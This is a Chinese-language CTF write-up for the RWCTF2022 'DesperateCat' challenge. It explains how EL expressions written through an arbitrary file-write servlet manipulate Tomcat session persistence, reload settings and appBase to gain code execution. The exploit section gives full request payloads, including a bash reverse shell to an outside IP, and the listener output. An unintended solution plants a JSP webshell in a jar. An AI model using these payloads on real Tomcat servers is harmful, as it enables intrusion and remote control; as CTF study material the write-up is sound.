# RWCTF2022-DesperateCat-Writeup



## 题目环境概述

环境是JDK8u311和tomcat9.0.56，需要rce，Servlet是一个任意写：

```java
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String dir = ParamUtil.getParameter(req, "dir");
        String fileName = ParamUtil.getParameter(req, "filename");
        String content = ParamUtil.getParameter(req, "content");
        if (StringUtil.isEmpty(content)) {
            this.outputMsg(resp, "Empty content");
        } else {
            if (!StringUtil.isEmpty(fileName) && fileName.indexOf(46) >= 0) {
                String fileExt = fileName.substring(fileName.lastIndexOf(46) + 1);
                fileName = StringUtil.randomStr() + "." + fileExt;
            } else {
                fileName = StringUtil.randomStr();
            }

            File saveFile;
            if (StringUtil.isEmpty(dir)) {
                saveFile = new File(this.exportDir, fileName);
            } else {
                saveFile = new File(this.getServletContext().getRealPath("/"), dir + File.separator + fileName);
            }

            String data = "DIRTY DATA AT THE BEGINNING " + content + " DIRTY DATA AT THE END";
            this.writeBytesToFile(saveFile, data.getBytes(StandardCharsets.UTF_8));
            this.outputMsg(resp, saveFile.getAbsolutePath());
        }
    }
```



但是将会有如下的替换：

```java
    private static final String[] SPECIAL_CHARS = new String[]{"&", "<", "'", ">", "\"", "(", ")"};
    private static final String[] REPLACE_CHARS = new String[]{"&amp;", "&lt;", "&#39;", "&gt;", "&quot;", "&#40;", "&#41;"};
```



## 官方解法

对于tomcat环境很容易想到jsp和EL表达式，对于EL表达式中的POC：

```java
${Runtime.getRuntime().exec(param.cmd)}
```

可以绕过`<%%>`，但是存在了括号，仍然不行。

接下来就是一堆nb trick的学习了。

首先是tomcat的session持久化：

> 对于一个企业级应用而言，Session对象的管理十分重要。Sessio对象的信息一般情况下置于服务器的内存中，当服务器由于故障重启，或应用重新加载 时候，此时的Session信息将全部丢失。为了避免这样的情况，在某些场合可以将服务器的Session数据存放在文件系统或数据库中，这样的操作称为 Session对象的持久化。Session对象在持久化时，存放在其中的对象以序列化的形式存放，这就是为什么一般存放在Session中的数据需要实 现可序列化接口（java.io.Serializable）的原因了。
>
>   当一个Session开始时，Servlet容器会为Session创建一个HttpSession对象。Servlet容器在某些情况下把这些 HttpSession对象从内存中转移到文件系统或数据库中，在需要访问 HttpSession信息时再把它们加载到内存中。

> 默认配置下，Tomcat 在关闭服务的时候，会将用户 Session 中的数据以序列化的形式持久存储到本地，这样下次 Tomcat 再启动的时候，能够从本地存储的 Session 文件中恢复先前的 Session 数据内容，避免造成用户 Session 还未到期就由于服务重启而失效。



默认存放在`work 应用目录下的 SESSIONS.ser`。

通过EL表达式可以修改这个存储文件的位置：

```java
${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}
```

然后通过EL表达式往session里面写东西：

```java
${sessionScope[param.b]=param.c}
```

这样如果tomcat停止服务后，就会往可控的文件中写入我们可控的内容。



但是肯定没法控制tomcat停止服务。。。官方文档中说程序触发`reload`也可以。



程序`reload`满足的条件：

1. Context reloadable 配置为 true（默认是 false）；
2. /WEB-INF/classes/ 或者 /WEB-INF/lib/ 目录下的文件发生变化。



第一点用EL修改：

```java
${pageContext.servletContext.classLoader.resources.context.reloadable=true}
```



第二点具体是这样：

- /WEB-INF/classes/ 下已加载过的 class 文件内容发生了修改；
- /WEB-INF/lib/ 下已加载过的 jar 文件内容发生了修改，或者写入了新的 jar 文件。

往`/WEB-INF/lib/`下面写个jar文件即可触发reload。

但是因为随便写入的jar包肯定不是正规的jar包，导致程序reload失败，直接挂了。

但是可以通过修改`appBase`目录，这个也就是我们默认的`webapps`。

如果把它修改成`/`，这样就可以访问整个文件系统，也就不局限于之前的那个文件夹了，可以往`/tmp`下面写了。

### EXP

先写入EL表达式：

```
http://1e30899e-bf6d-46db-bf05-a1eba79f7d59.node4.buuoj.cn:81/export

filename=1.jsp&content=
%24%7BpageContext.servletContext.classLoader.resources.context.manager.pathname%3Dparam.a%7D%0A%24%7BsessionScope%5Bparam.b%5D%3Dparam.c%7D%0A%24%7BpageContext.servletContext.classLoader.resources.context.reloadable%3Dtrue%7D%0A%24%7BpageContext.servletContext.classLoader.resources.context.parent.appBase%3Dparam.d%7D
```

然后触发，使得reload之后能往`/tmp/session.jsp`里面写反弹shell：

```
http://1e30899e-bf6d-46db-bf05-a1eba79f7d59.node4.buuoj.cn:81/export/b00dd97fd5f740bfbb73dce9ae58078e.jsp

a=/tmp/session.jsp&b=feng&c=%3C%25Runtime.getRuntime().exec(new%20String%5B%5D%7B%22%2Fbin%2Fbash%22%2C%20%22-c%22%2C%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.5.169.223%2F39876%200%3E%261%22%7D)%3B%25%3E&d=/
```

最后往`./WEB-INF/lib`下面写个jar文件：

```
http://1e30899e-bf6d-46db-bf05-a1eba79f7d59.node4.buuoj.cn:81/export

dir=./WEB-INF/lib/&filename=1.jar&content=1
```

再访问`http://1e30899e-bf6d-46db-bf05-a1eba79f7d59.node4.buuoj.cn:81/tmp/session.jsp`即可触发反弹shell：

```shell
root@VM-0-6-ubuntu:~# nc -lvvp 39876
Listening on [0.0.0.0] (family 0, port 39876)
Connection from 117.21.200.166 45861 received!
sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
readflag
root
run
sbin
srv
sys
tmp
usr
var
$ /readflag
flag{121a8166-c375-40f3-802a-1bdef43f18d2}

```



## 非预期

直接往`./WEB-INF/lib/`下面写一个ascii范围在0-127的jar包，把jsp马放到jar包的`META-INF/resources/`下面，reload之后即可访问。

这种reload借助的是`Tomcat Context WatchedResource`。

在 Tomcat 9 环境下，默认的 WatchedResource 包括：

- WEB-INF/web.xml
- WEB-INF/tomcat-web.xml
- ${CATALINA_HOME}/conf/web.xml

> Tomcat 会有后台线程去监控这些文件资源，在 Tomcat 开启 autoDeploy 的情况下（此值默认为 true，即默认开启 autoDeploy），一旦发现这些文件资源的 lastModified 时间被修改，也会触发 reload

这样也可以reload。

具体可以参考回忆飘如雪师傅的文章：

https://mp.weixin.qq.com/s/V5UzhjWKgB7_cAJWer8mZg

不过jar构造那里我确实没看太懂。。。。





## 总结

全是没见过的思路，学习了。。。以后有空一定把jar包构造那部分好好学学。











